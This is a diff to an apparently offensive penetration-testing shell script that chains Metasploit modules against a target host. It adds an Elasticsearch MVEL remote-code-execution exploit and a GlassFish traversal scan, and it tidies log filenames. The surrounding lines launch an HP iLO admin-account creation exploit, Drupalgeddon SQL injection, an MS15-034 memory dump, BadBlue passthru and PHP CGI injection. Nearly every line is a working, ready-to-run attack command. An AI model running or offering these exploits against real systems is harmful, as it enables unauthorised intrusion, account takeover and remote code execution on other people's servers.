@@ -141,27 +141,47 @@ if [ "$MODE" = "web" ]; then
         echo -e "${OKGREEN}====================================================================================${RESET}"
         echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
         echo -e "${OKGREEN}====================================================================================${RESET}"
-        msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw
-        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.txt 2> /dev/null
-        rm -f $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw 2> /dev/null
+        msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw
+        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.txt 2> /dev/null
+        rm -f $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw 2> /dev/null
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED RUNNING ELASTICSEARCH DYNAMIC SCRIPT JAVA INJECTION EXPLOIT $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.raw
+        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.raw > $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.txt 2> /dev/null
+        rm -f $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.raw 2> /dev/null
         echo -e "${OKGREEN}====================================================================================${RESET}"
         echo -e "$OKRED RUNNING DRUPALGEDDON HTTP PARAMETER SQL INJECTION CVE-2014-3704 $RESET"
         echo -e "${OKGREEN}====================================================================================${RESET}"
         msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.raw
         sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.txt 2> /dev/null
         rm -f $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.raw 2> /dev/null
+
+
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED RUNNING GLASSFISH ADMIN TRAVERSAL EXPLOIT $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        msfconsole -q -x "use scanner/http/glassfish_traversal; setg RHOSTS "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.raw
+        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.txt 2> /dev/null
+        rm -f $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.raw 2> /dev/null
+
+
+
+        
+
+
         echo -e "${OKGREEN}====================================================================================${RESET}"
         echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
         echo -e "${OKGREEN}====================================================================================${RESET}"
-        msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set WAIT 2; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.raw
+        msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "80"; set WAIT 2; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.raw
         sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.raw > $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.txt 2> /dev/null
         rm -f $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.raw 2> /dev/null
         echo -e "${OKGREEN}====================================================================================${RESET}"
         echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
         echo -e "${OKGREEN}====================================================================================${RESET}"
-        msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw
-        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.txt 2> /dev/null
-        rm -f $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw 2> /dev/null
+        msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw
+        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.txt 2> /dev/null
+        rm -f $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw 2> /dev/null
         echo -e "${OKGREEN}====================================================================================${RESET}"
         echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
         echo -e "${OKGREEN}====================================================================================${RESET}"
